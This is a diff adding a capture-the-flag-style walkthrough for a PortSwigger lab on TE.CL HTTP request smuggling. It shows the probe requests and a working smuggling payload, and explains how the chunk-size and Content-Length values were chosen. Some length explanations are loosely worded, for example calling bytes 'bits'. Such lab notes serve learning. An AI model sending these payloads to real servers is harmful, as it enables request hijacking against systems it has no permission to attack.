@@ -53,4 +53,65 @@ Now modify the second repeated request (lets call it "Normal request" like chang
 Now everyting is ready.
 Send the Attacking request, and after that send the Normal request, and we solved the lab.
 
+Task 2:
+///Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses///
+
+Open the site in burpsuite, send the GET / request to repeater. In repeater change the http protocol to 1, change the method to POST, uncheck the "update content length" and turn on show non-printable chars.
+Delete the unneccessary lines, and type 1 plus line into the request:
+POST / HTTP/1.1
+Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+X (press enter after the X)
+
+Send the request, and you will get a 400 bad request response so the front-end rejected the request which means it can be vulnerable to TE.CL or TE.TE,
+So check down the backend server..Change the request like this:
+POST / HTTP/1.1
+Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X (DO NOT press enter after the X!!!)
+And send the request...and it timed out, which means its a TE.CL velnerability.
+
+To solve the lab, change the request like:
+POST / HTTP/1.1
+Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+9f
+POST /asd HTTP/1.1
+Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+
+x=1
+0
+
+So what is 9f, how i know the content lenght 15 etc...if you  select this 3 line:
+
+x=1
+0
+In burpsuites window on the right side there is a little part called 'inspector'. If you select anything in the request it will show you something like this: 10(0xa).
+So if you select this 3 lines you will see the number 10 (which means 10 bits), all you have to do is set the 2nd content-length to bigger then this number, so 10+ (11,12,13...etc, i picked 17)
+What is that 9f. Select the characters from the beginning of the 2nd POST to the end of x=1 (without the \r\n). Check the inspector part again, to me, its 159(0x9f).
+Whatever is after the x copy that there.
+And the first content-length is this two line:
+
+9f
+To me its 4(0x4) which means its 4.
+Before we run our attack, send the original GET / request again to the repeater, change the HTTP protocol to 1. Now send the modified request, then the normal request, and we solved the lab.
+
+
+
+
 
